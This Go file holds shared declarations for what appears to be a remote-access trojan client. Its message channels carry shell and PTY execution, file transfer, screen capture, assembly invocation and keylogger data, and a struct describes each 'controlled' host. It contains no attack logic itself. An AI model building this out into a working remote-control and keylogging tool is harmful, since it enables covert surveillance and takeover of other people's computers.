package common

import "github.com/togettoyou/wsc"

var ClientId = ""

var DefaultMsgChan = make(chan string)
var FileSliceMsgChan = make(chan []byte)
var ExecShellMsgChan = make(chan string)
var ExecPtyMsgChan = make(chan string)
var ProcessListChan = make(chan string)
var AssemblyListMsgChan = make(chan string)
var AssemblyInvokeMsgChan = make(chan string)
var ScreenSliceMsgChan = make(chan []byte)
var KeyloggerDataChan = make(chan string)

var MessageQueue []string

// CmdInfo 消息结构
type CmdInfo struct {
	Context string //信息内容
	Attach  string //附加信息
}

type ClientInfo struct {
	ClientId   string
	SendUserId string
	MessageId  string
	Code       int
	Msg        string
	Data       *string
}

// HostInfo 被控端信息
type HostInfo struct {
	SystemId  string //SystemId
	ClientId  string //主机标识
	Hostname  string //主机名
	Ip        string //上线ip
	ConnPort  string //上线端口
	Privilege string //执行权限
	Os        string //操作系统版本
	Version   string //连接客户端版本
}

type RetData struct {
	MessageId  string      `json:"messageId"`
	SendUserId string      `json:"sendUserId"`
	Code       int         `json:"code"`
	Msg        string      `json:"msg"`
	Data       interface{} `json:"data"`
}

type HttpRetData struct {
	Code int         `json:"code"`
	Msg  string      `json:"msg"`
	Data interface{} `json:"data"`
}

var Ws *wsc.Wsc
